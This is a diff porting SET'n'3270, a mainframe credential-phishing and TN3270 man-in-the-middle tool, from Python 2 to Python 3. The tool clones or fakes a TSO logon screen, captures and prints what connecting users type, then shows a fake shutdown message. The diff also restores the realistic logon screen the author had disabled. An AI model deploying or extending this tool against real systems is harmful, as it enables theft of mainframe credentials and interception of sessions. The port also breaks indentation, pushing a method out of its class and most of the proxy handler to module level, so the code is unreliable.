@@ -20,7 +20,7 @@ try:
 	from OpenSSL import SSL
 	openssl_available = True
 except ImportError:
-	print "[!!] OpenSSL Library not available. SSL MitM will be disabled."
+	print("[!!] OpenSSL Library not available. SSL MitM will be disabled.")
 	openssl_available = False
 
 class c:
@@ -35,15 +35,15 @@ class c:
     DARKGREY = '\033[1;30m'
     
 
-    def disable(self):
-        self.BLUE = ''
-        self.GREEN = ''
-        self.YELLOW = ''
+def disable(self):
+	self.BLUE = ''
+	self.GREEN = ''
+	self.YELLOW = ''
 	self.DARKBLUE = ''
 	self.PURPLE = ''
-	seld.WHITE= ''
-        self.RED = ''
-        self.ENDC = ''
+	self.WHITE= ''
+	self.RED = ''
+	self.ENDC = ''
 
 
 def send_tn(clientsock, data):
@@ -59,7 +59,7 @@ def recv_tn(clientsock, timeout=100):
 	return data
 
 def signal_handler(signal, frame):
-        print c.ENDC+ "\nGAME OVER MAN!\n"
+        print(c.ENDC+ "\nGAME OVER MAN!\n")
         sys.exit(0)
 signal.signal(signal.SIGINT, signal_handler)
 
@@ -69,19 +69,19 @@ def fake_tso():
 			  # Uncomment the following line, and then comment the line 
 			  # below it for a real TSO logon screen. 
 			  # C'mon son I wouldn't make it easy for you!
-			  #"60606060606060606060606060606040e3e2d661c540d3d6c7d6d5406060" +
-			  "6060606060606060606060606060409596e3e2d661c540d3d6c7d6d54060" +
+			  "60606060606060606060606060606040e3e2d661c540d3d6c7d6d5406060" +
+			  #"6060606060606060606060606060409596e3e2d661c540d3d6c7d6d54060" +
 			  "606060606060606060606060606060606060606060606060606060606060" +
 			  "6060606011c1501de8" +
 			  ########## Uncomment the following lines for a 'real' TSO screen
 			  ########## And comment the lines between the '---------'
-			  #"404040404040404040404040404040404040404040" +    
-			  #"404040404040404040404040404040404040404040404040404040404040" +
-			  #"404040404040404040404040404040404040404040404040404040404011" +
+			  "404040404040404040404040404040404040404040" +    
+			  "404040404040404040404040404040404040404040404040404040404040" +
+			  "404040404040404040404040404040404040404040404040404040404011" +
 			  #----------- This adds 'DEFCON 23' to each TSO screen, lol ------			  
-			  "606060606060606060606060606060606060606060"                   +
-			  "606060606060606060606040c4c5c6c3d6d540f2f3406060606060606060" +
-			  "606060606060606060606060606060606060606060606060606060604011" +
+			  #"606060606060606060606060606060606060606060"                   +
+			  #"606060606060606060606040c4c5c6c3d6d540f2f3406060606060606060" +
+			  #"606060606060606060606060606060606060606060606060606060604011" +
 			  #----------------------------------------------------------------
 			  "c2601de84040404040404040404040404040404040404040404040404040" +
 			  "404040404040404040404040404040404040404040404040404040404040" +
@@ -165,7 +165,7 @@ def get_data(tn3270, data, buff):
 
 		j = 1
 		for item in pbuff.split():
-			print"[+] Line "+ str(j) +":", item 
+			print("[+] Line "+ str(j) +":", item)
 			j += 1
 	else:
 		pbuff = ''
@@ -173,7 +173,7 @@ def get_data(tn3270, data, buff):
 	return pbuff
 
 def logo():
-	print c.DARKBLUE
+	print(c.DARKBLUE)
 	logo = []
 	logo.append("""
 .::::::. .,::::::  ::::::::::::: :: ::.    :::.  ::  .::.      .:::.  ...:::::        
@@ -224,21 +224,21 @@ MMMMMMMMMMM MMMMMMMMMMMM MMMMMMMMMM                                             
  |:  1   | |:  1   |   |:  |                     |:  1   | |:  1  \    |   |   |:  1   |
  |::.. . | |::.. . |   |::.|                     |::.. . | |::.. . |   |   |   |::.. . |
  `-------' `-------'   `---'                     `-------' `-------'   `---'   `-------'""")
-	print logo[random.randrange(0, len(logo) - 1)], "\n"
-	print c.ENDC
+	print(logo[random.randrange(0, len(logo) - 1)], "\n")
+	print(c.ENDC)
 
 ###### Special, just for DEFCON
 def printer(s):
-    for c in s:
-	sys.stdout.write( c )
-        sys.stdout.flush()
-        time.sleep(random.uniform(0, 0.15))
-    print "\n",
+	for c in s:
+		sys.stdout.write( c )
+		sys.stdout.flush()
+		time.sleep(random.uniform(0, 0.15))
+	print("\n")
 
 def printv(str):
 	""" Prints str if we're in verbose mode """
 	if args.verbose:
-		print str
+		print(str)
 
 def get_all(sox):
 	#terrible, I know	
@@ -256,83 +256,83 @@ def proxy_handler(clientsock, target, port, tn3270, delay=0.001):
 	# passthrough proxy
 	timeout = 3
 	if args.verbose:
-		print "[+] Proxy Started. Sending all packets to", target
-		print "[+] Connecting to", target, ":", port
+		print("[+] Proxy Started. Sending all packets to", target)
+		print("[+] Connecting to", target, ":", port)
 	try:
-		print "[+] Trying SSL"
+		print("[+] Trying SSL")
 		non_ssl = socket(AF_INET, SOCK_STREAM)
 		ssl_sock = ssl.wrap_socket(sock=non_ssl,cert_reqs=ssl.CERT_NONE)
 		#ssl_sock.settimeout(timeout)
 		ssl_sock.connect((target,port))
 		serversock = ssl_sock
-	except ssl.SSLError, e:
+	except ssl.SSLError as e:
 		ssl_sock.close()
 		try:
-			print "[+] Using Plaintext"
+			print("[+] Using Plaintext")
 			sock = socket(AF_INET, SOCK_STREAM)
 			sock.settimeout(timeout)
 			sock.connect((target,port))
 			serversock = sock
-		except Exception, e:
-			print '[!] Socket Error:', e
+		except Exception as e:
+			print('[!] Socket Error:', e)
 			return False
-	except Exception, e:
+	except Exception as e:
                # This is terrible best practice but #YOLOSEC!
-               print '[!] Error:', e
+               print('[!] Error:', e)
                ssl_sock.close()
                try:
-                        print "[+] Using Plaintext"
+                        print("[+] Using Plaintext")
                         sock = socket(AF_INET, SOCK_STREAM)
                         sock.settimeout(timeout)
                         sock.connect((target,port))
                         serversock = sock
-               except Exception, e:
-                        print '[!] Socket Error:', e
+               except Exception as e:
+                        print('[!] Socket Error:', e)
                         return False
 #	       print '[!] Error:', e
 #		return False
-	print "[+] Connection complete. MitM Ahoy!"
+print("[+] Connection complete. MitM Ahoy!")
 	#serversock = socket(AF_INET, SOCK_STREAM)
 	#serversock.connect((target, port))
 	#serversock.settimeout(5)
-	channel = {}
-	connections = []
-	connections.append(clientsock)
-	connections.append(serversock)
-	channel[clientsock] = serversock
-	channel[serversock] = clientsock
-	while 1:
-		ssl_you_bastard = False
-		time.sleep(delay)
-		inputready, outputready, exceptready = select.select(connections, [], [], 5)
-		for s in inputready:
-			s.settimeout(10)
-			#s.setblocking(0)
-			try:
-				data = s.recv(1920)
-			except SSL.WantReadError:
-				ssl_you_bastard = True
-				data = ''
-			except SSL.ZeroReturnError:
-				ssl_you_bastard = False
-				data = ''
-			if len(data) == 0 and not ssl_you_bastard:
-				print '[+] Disconnected', s.getpeername()
-				connections.remove(s)
-				connections.remove(channel[s])
-				out = channel[s]
-				# close the connection with client
-				channel[out].close()  # equivalent to do s.close()
-				# close the connection with remote server
-				channel[s].close()
-				# delete both objects from channel dict
-				del channel[out]
-				del channel[s]
-				break
-			else:
-				buff = list("\0" * 1920)
-				pbuff = get_data(tn3270, data, buff)
-				channel[s].sendall(data)
+channel = {}
+connections = []
+connections.append(clientsock)
+connections.append(serversock)
+channel[clientsock] = serversock
+channel[serversock] = clientsock
+while 1:
+	ssl_you_bastard = False
+	time.sleep(delay)
+	inputready, outputready, exceptready = select.select(connections, [], [], 5)
+	for s in inputready:
+		s.settimeout(10)
+		#s.setblocking(0)
+		try:
+			data = s.recv(1920)
+		except SSL.WantReadError:
+			ssl_you_bastard = True
+			data = ''
+		except SSL.ZeroReturnError:
+			ssl_you_bastard = False
+			data = ''
+		if len(data) == 0 and not ssl_you_bastard:
+			print('[+] Disconnected', s.getpeername())
+			connections.remove(s)
+			connections.remove(channel[s])
+			out = channel[s]
+			# close the connection with client
+			channel[out].close()  # equivalent to do s.close()
+			# close the connection with remote server
+			channel[s].close()
+			# delete both objects from channel dict
+			del channel[out]
+			del channel[s]
+			break
+		else:
+			buff = list("\0" * 1920)
+			pbuff = get_data(tn3270, data, buff)
+			channel[s].sendall(data)
 
 
 
@@ -350,7 +350,7 @@ def handler(clientsock,addr,tn3270, screen, cmd_tracker, commands=False):
 
 	if data != tn3270lib.IAC + tn3270lib.WONT + tn3270lib.options['TN3270']:
 		#We don't support 3270E and your client is messed up, exiting
-		tn3270.msg(1,"Didn't negotiate tn3270 telnet options, quitting!")
+		tn3270.msg(1,"Didn't negotiate TN3270 telnet options, quitting!")
 		clientsock.close()
 		return
 
@@ -408,7 +408,7 @@ def handler(clientsock,addr,tn3270, screen, cmd_tracker, commands=False):
 		current_screen += 1
 
 		if commands is not False:
-			print commands
+			print(commands)
 			if timing >= len(commands):
 				commands = False
 				continue
@@ -418,16 +418,16 @@ def handler(clientsock,addr,tn3270, screen, cmd_tracker, commands=False):
 				pbuff = get_data(tn3270, data, buff)
 				try:
 					command_received = pbuff.split()[0]
-				except (IndexError, AttributeError), e:
+				except (IndexError, AttributeError) as e:
 					command_received = "AID"
 
 				items_to_next_input = cmd_tracker[current_command]
 
 				if command_received == current_command or current_command == "*":
 					if args.verbose: 
-						print "[+] Current Command:", current_command,"Command Recieved:" , command_received
-						print "[+] Current Screen:", current_screen, "items to next input:", items_to_next_input
-						print "[+] Command Tracker:", cmd_tracker
+						print("[+] Current Command:", current_command,"Command Received:" , command_received)
+						print("[+] Current Screen:", current_screen, "items to next input:", items_to_next_input)
+						print("[+] Command Tracker:", cmd_tracker)
 					while current_screen < items_to_next_input:
 						send_tn(clientsock, screen[current_screen] + tn3270lib.IAC + tn3270lib.TN_EOR)
 						current_screen += 1
@@ -437,9 +437,9 @@ def handler(clientsock,addr,tn3270, screen, cmd_tracker, commands=False):
 					send_tn(clientsock, screen[current_screen] + tn3270lib.IAC + tn3270lib.TN_EOR)
 					data  = get_all(clientsock)
 				else:
-					print "[+] Displaying Dummy Screen"
-					send_tn(clientsock, fake_goodbye("ERROR: Feature currently not enalbled.") + tn3270lib.IAC + tn3270lib.TN_EOR)
-					print "[+] Sleeping 5"
+					print("[+] Displaying Dummy Screen")
+					send_tn(clientsock, fake_goodbye("ERROR: Feature currently not enabled.") + tn3270lib.IAC + tn3270lib.TN_EOR)
+					print("[+] Sleeping 5")
 					time.sleep(5)
 					not_done = False
 					break
@@ -448,16 +448,16 @@ def handler(clientsock,addr,tn3270, screen, cmd_tracker, commands=False):
 			buff = list("\0" * 1920)
 			pbuff = get_data(tn3270, data, buff)
 			#print tn3270.hexdump(pbuff)
-			print "[+] Displaying Dummy Screen"
+			print("[+] Displaying Dummy Screen")
 			send_tn(clientsock, fake_goodbye(args.goodbye) + tn3270lib.IAC + tn3270lib.TN_EOR)
-			print "[+] Sleeping 5"
+			print("[+] Sleeping 5")
 			time.sleep(5)
 			break
 
 		#data  = recv_tn(clientsock)
 
 	clientsock.close()
-	print "[+] Connection Closed", addr
+	print("[+] Connection Closed", addr)
 	
 	#tn3270.msg(1,"%r Closed Connection", addr) #log on console
 
@@ -469,13 +469,13 @@ parser.add_argument('target',help='The z/OS Mainframe TN3270 Server IP or Hostna
 parser.add_argument('-p','--port',help='The TN3270 server port. Default is 23', dest='port', default=23, type=int)
 parser.add_argument('--proxy', help='Operates as a MITM proxy', dest='proxy', action='store_true',default=False)
 parser.add_argument('-c','--commands',help='Typed commands you want to send/expect to receive. Multiple commands can be seperated by a semi-colon \';\'. e.g: ./SETn3270.py target.com --commands "logon;netview;tso"', dest='commands', default=False)
-parser.add_argument('-g','--goodbye',help='Message disaplayed on targets screen when at the end', dest='goodbye', default="System Shutdown. Please connect to production LPAR.")
+parser.add_argument('-g','--goodbye',help='Message displayed on targets screen when at the end', dest='goodbye', default="System Shutdown. Please connect to production LPAR.")
 # TODO: Add custom screens. For now just replace the hex in the fake_tso() function
 #parser.add_argument('-s', '--screen', help='A file containing a screen you want to display. Format must be single line all hex chats, see tso.txt for an example.',dest='screen', default=False)
 parser.add_argument('--ssl',help='Force SSL connections from the client.',default=False,dest='ssl',action='store_true')
 parser.add_argument('-v','--verbose',help='Be verbose',default=False,dest='verbose',action='store_true')
 parser.add_argument('-d','--debug',help='Show debug information. Displays A LOT of information',default=False,dest='debug',action='store_true')
-parser.add_argument('--altport',help='Define an alternate port to accept connections to. Note: Most tn3270 clients don\'t make it easy to change ports so don\'t expect your targets to do so',dest='altport',default=False, type=int)
+parser.add_argument('--altport',help='Define an alternate port to accept connections to. Note: Most TN3270 clients don\'t make it easy to change ports so don\'t expect your targets to do so',dest='altport',default=False, type=int)
 parser.add_argument('--nossl',help='Disable server side SSL. Note: Most clients will fail if you do not have SSL enabled when they expect SSL connections.',default=False,dest='nossl',action='store_true' )
 #parser.add_argument('--defcon',help='Disable Warning',default=False,dest='defcon',action='store_true') #LOL!
 args = parser.parse_args()
@@ -495,7 +495,7 @@ commands = False
 target_ssl = False
 cmd_tracker = {}
 
-print '[+] Starting SET\'n\'3270'
+print('[+] Starting SET\'n\'3270')
 
 # First we need an object:
 tn = tn3270lib.TN3270()
@@ -506,17 +506,17 @@ if args.debug:
 if args.proxy:
 	# setup the proxy aspect
 	if args.target is None:
-		print c.RED + "[+] Passthrough mode selected but no target entered. Exiting!" + c.ENDC
+		print(c.RED + "[+] Passthrough mode selected but no target entered. Exiting!" + c.ENDC)
 		sys.exit(-1)
 	
-	print "[+] Starting passthrough mode on port", 
+	print("[+] Starting passthrough mode on port")
 	if not args.altport: 
-		print args.port
+		print(args.port)
 	else:
-		print args.altport
+		print(args.altport)
 	
 	if args.ssl and openssl_available:
-		print "[+] Creating SSL Socket"
+		print("[+] Creating SSL Socket")
 		tnssl = SSL.Context(SSL.SSLv23_METHOD)
 		tnssl.use_privatekey_file('setn3270_key')
 		tnssl.use_certificate_file('setn3270_cert')
@@ -524,10 +524,10 @@ if args.proxy:
 		tnsock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
 		tnsock = SSL.Connection(tnssl, tnsock)
 	else:
-		print "[+] Creating Plaintext Socket"
+		print("[+] Creating Plaintext Socket")
 		tnsock = socket(AF_INET, SOCK_STREAM)
 		tnsock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
-		print "[+] Creating SSL Passthrough"
+		print("[+] Creating SSL Passthrough")
 	#print "[+] Starting passthrough mode on port", args.port
 	if not args.altport:
 		ADDR = ('', args.port)
@@ -537,29 +537,29 @@ if args.proxy:
 	tnsock.bind(ADDR)
 	tnsock.listen(5)
 
-	print "[+] Waiting for Incomming Connections on port", args.port
+	print("[+] Waiting for Incoming Connections on port", args.port)
 	while 1:
 		clientsock, addr = tnsock.accept()
-		print '[+] Connection Recieved from:', addr
+		print('[+] Connection Received from:', addr)
 		thread.start_new_thread(proxy_handler, (clientsock, args.target, args.port, tn ))
 else:
 	# Now we either strip a target mainframe 
 	# or we display a default TSO logon screen
 	if args.target is not None:
-		print "[+] Connecting to ", args.target, ":", args.port
+		print("[+] Connecting to ", args.target, ":", args.port)
 		if not tn.initiate(args.target,args.port):
-			print "[!] Could not connect to", args.target, ":", args.port
+			print("[!] Could not connect to", args.target, ":", args.port)
 			sys.exit(-1)
 		if args.verbose: 
-			print "[+] Current screen is:"
+			print("[+] Current screen is:")
 			tn.print_screen()
 		if args.commands is not False:
 			commands = args.commands.split(';')
-			print "[+] Sending Commands:", 
-			print commands
+			print("[+] Sending Commands:")
+			print(commands)
 			for command in commands:
 				if args.verbose:
-					print "[+] Sending Command:", command
+					print("[+] Sending Command:", command)
 				if command == "*":
 					tn.send_cursor('fake')
 				else:
@@ -568,21 +568,21 @@ else:
 				tn.get_all_data()
 				cmd_tracker[command] = len(tn.raw_screen_buffer()) - 1
 				if args.verbose: 
-					print "[+] Current screen is:"
+					print("[+] Current screen is:")
 					tn.print_screen()
 
-		print "[+] Mainframe Screen Copy Complete"
+		print("[+] Mainframe Screen Copy Complete")
 		if args.verbose:
-			print "[+] Closing Connection to Mainframe"
+			print("[+] Closing Connection to Mainframe")
 		tn.disconnect()
 		screen = tn.raw_screen_buffer()
 		target_ssl = tn.is_ssl()
 	else:
-		print "[+] No target specified. Creating fake TSO screen on port",
+		print("[+] No target specified. Creating fake TSO screen on port")
 		if not args.altport:
-			print args.port
+			print(args.port)
 		else:
-			print args.altport
+			print(args.altport)
 		screen = []
 		screen.insert(0,fake_tso())
 
@@ -593,7 +593,7 @@ else:
 	
 	if (target_ssl or args.ssl) and openssl_available:
 		#do ssl stuff
-		print "[+] Creating SSL Socket"
+		print("[+] Creating SSL Socket")
 		tnssl = SSL.Context(SSL.SSLv23_METHOD)
 		tnssl.use_privatekey_file('setn3270_key')
 		tnssl.use_certificate_file('setn3270_cert')
@@ -602,21 +602,21 @@ else:
 		tnsock = SSL.Connection(tnssl, tnsock)
 		#tnsock.setblocking()
 	else:
-		print "[+] Creating Plaintext Socket"
+		print("[+] Creating Plaintext Socket")
 		tnsock = socket(AF_INET, SOCK_STREAM)
 		tnsock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
 
 	tnsock.bind(ADDR)
 	tnsock.listen(5)
 
-	print "[+] Waiting for Incomming Connections on port", 
+	print("[+] Waiting for Incomming Connections on port")
 	if not args.altport: 
-		print args.port
+		print(args.port)
 	else:
-		print args.altport
+		print(args.altport)
 	while 1:
 		clientsock, addr = tnsock.accept()
-		print '[+] Connection Recieved from:', addr
+		print('[+] Connection Recieved from:', addr)
 		thread.start_new_thread(handler, (clientsock, addr, tn, screen, cmd_tracker, commands  ))
 
 
